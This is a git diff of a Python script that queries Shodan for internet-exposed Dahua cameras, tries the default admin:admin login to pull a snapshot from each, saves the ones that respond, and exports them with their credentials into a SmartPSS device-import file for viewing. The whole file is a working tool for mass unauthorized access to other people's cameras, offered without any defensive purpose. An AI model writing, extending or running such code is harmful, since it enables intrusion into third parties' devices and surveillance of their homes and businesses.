@@ -11,11 +11,21 @@ iplist = []
 vulnlist = []
 
 
-# Gets available Dahua Hosts in given country
-def getaddresses(amount):
+# Make pretty colors :)
+def prRed(skk): print("\033[91m {}\033[00m".format(skk))
+
+
+def prCyan(skk): print("\033[96m {}\033[00m".format(skk))
+
+
+def prGreen(skk): print("\033[92m {}\033[00m".format(skk))
+
+
+# Gets available Dahua Hosts from search query
+def getaddresses(amount, query):
     limit = amount
     counter = 0
-    for banner in api.search_cursor('Dahua country:NL'):
+    for banner in api.search_cursor(query):
         ip = str(banner['ip_str'])
         print(ip)
         # city = str(banner['location'])
@@ -28,7 +38,7 @@ def getaddresses(amount):
 
 # Generates link to which the request is sent, asking for a snapshot of first available channel using standard login
 # credentials.
-def linkbuilder(iplist):
+def linkbuilder():
     linklist = []
     for ip in iplist:
         link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
@@ -37,7 +47,7 @@ def linkbuilder(iplist):
 
 
 # Makes request call to Dahua Product API, asking for a snapshot of first channel available
-# If request is succesfull (HTML code 200), True is returned for vulnerable with standard login credentials.
+# If request is succesful (HTML code 200), True is returned for vulnerable with standard login credentials.
 def request(link):
     try:
         response = requests.get(link, verify=False, timeout=3)
@@ -49,20 +59,7 @@ def request(link):
         pass
 
 
-def run(amount):
-    getaddresses(amount)
-    for ip in iplist:
-        link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
-        print("trying: " + link)
-        if request(link):
-            print('Succes!')
-            vulnlist.append(ip)
-        else:
-            print("Fail!")
-    print("Vulnerable IP's:")
-    return vulnlist
-
-
+# Saves output (vulnerable IP's) to list.txt
 def save():
     with open('./list.txt', 'w') as filehandle:
         for vuln in vulnlist:
@@ -70,5 +67,39 @@ def save():
             filehandle.write('%s\n' % vuln)
 
 
-print(run(150))
-print(save())
+# Creates device.xml template to be imported for SmartPSS
+def gendevice():
+    firstline = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+    secondline = "<DeviceManager version=\"2.0\">"
+    lastline = "</DeviceManager>"
+    with open('./devices.txt', 'w') as filehandle:
+        filehandle.write('%s\n' % firstline)
+        filehandle.write('%s\n' % secondline)
+        for vuln in vulnlist:
+            nmbr = vulnlist.index(vuln)
+            newdev = "<Device name=\"Webcrawler\" \"" + str(nmbr) + "\"" + "\" domain=" + vuln + "port=\"37777\" " \
+                                                                                                 "username=\"admin\" " \
+                                                                                                 "password=\"admin\" " \
+                                                                                                 "protocol=\"1\" " \
+                                                                                                 "connect=\"0\" /> "
+            filehandle.write('%s\n' % newdev)
+        filehandle.write('%s\n' % lastline)
+
+
+# main function
+def run(amount, query):
+    getaddresses(amount, str(query))
+    for ip in iplist:
+        link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
+        prCyan("trying: " + link)
+        if request(link):
+            prGreen('Succes!')
+            vulnlist.append(ip)
+        else:
+            prRed("Fail!")
+    return vulnlist
+    print(save())
+
+
+print(run(50, "Dahua \"server: Dahua Rtsp Server\""))
+gendevice()
